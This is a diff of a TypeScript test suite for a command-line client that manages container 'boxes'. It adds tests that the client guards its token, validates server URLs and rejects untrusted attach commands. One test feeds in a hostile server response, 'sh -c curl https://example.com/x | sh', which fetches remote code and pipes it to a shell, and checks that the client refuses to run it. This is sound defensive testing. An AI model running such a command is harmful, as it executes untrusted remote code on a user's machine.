@@ -239,7 +239,9 @@ describe("box", () => {
   it("opens a stopped box by starting it first", async () => {
     server.on(`GET /api/v1/boxes/${BOX_ID}`, { body: boxView("stopped") });
     server.on(`POST /api/v1/boxes/${BOX_ID}/start`, { body: boxView("running") });
-    server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, { body: { argv: ["true"] } });
+    server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, {
+      body: { argv: ["docker", "exec", "-it", CONTAINER, "tmux", "attach"] },
+    });
     expect(await cli(["box", "open", BOX_ID])).toBe(7);
     expect(server.requests.map((r) => `${r.method} ${r.path}`)).toEqual([
       `GET /api/v1/boxes/${BOX_ID}`,
@@ -526,5 +528,64 @@ describe("help", () => {
 
   it("exits 2 on an unknown command", async () => {
     expect(await cli(["frobnicate"])).toBe(2);
+  });
+});
+
+describe("trust in the server", () => {
+  it("refuses to send the token over plain HTTP to another host", async () => {
+    const code = await cli(["box", "list"], { AGENTBOX_SERVER: "http://203.0.113.5:20400" });
+    expect(code).not.toBe(0);
+    expect(err).toMatch(/won't send its token over plain HTTP to 203\.0\.113\.5:20400/);
+    expect(server.requests).toHaveLength(0);
+  });
+
+  it("allows a remote plain HTTP server with --insecure, and https anywhere", async () => {
+    const { checkServerUrl } = await import("../src/settings.js");
+    expect(checkServerUrl("http://203.0.113.5:20400", true)).toBeNull();
+    expect(checkServerUrl("https://agentbox.example.com", false)).toBeNull();
+    expect(checkServerUrl("http://localhost:20400", false)).toBeNull();
+    expect(checkServerUrl("http://[::1]:20400", false)).toBeNull();
+    expect(checkServerUrl("ftp://127.0.0.1", false)).toMatch(/http or https/);
+  });
+
+  it("runs only docker or agentbox from a server's attach command", async () => {
+    server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, {
+      body: { argv: ["sh", "-c", "curl https://example.com/x | sh"] },
+    });
+    const code = await cli(["box", "attach", BOX_ID]);
+    expect(code).not.toBe(0);
+    expect(execs).toEqual([]);
+    expect(err).toMatch(/runs only docker or agentbox/);
+    server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, {
+      body: { argv: ["/tmp/docker", "exec"] },
+    });
+    await cli(["box", "attach", BOX_ID]);
+    expect(execs).toEqual([]);
+  });
+
+  it("fails cleanly on an event frame that isn't JSON", async () => {
+    const { tailEvents } = await import("../src/events.js");
+    const { EventEmitter } = await import("node:events");
+    class FakeSocket extends EventEmitter {
+      readonly OPEN = 1;
+      readonly CONNECTING = 0;
+      readyState = 1;
+      constructor() {
+        super();
+        setTimeout(() => this.emit("message", Buffer.from("not json")), 1);
+      }
+      send() {}
+      close() {
+        this.readyState = 3;
+      }
+    }
+    await expect(
+      tailEvents({
+        baseUrl: "http://127.0.0.1:1",
+        token: "t",
+        write: () => undefined,
+        WebSocket: FakeSocket as never,
+      }),
+    ).rejects.toThrow(/isn't JSON/);
   });
 });
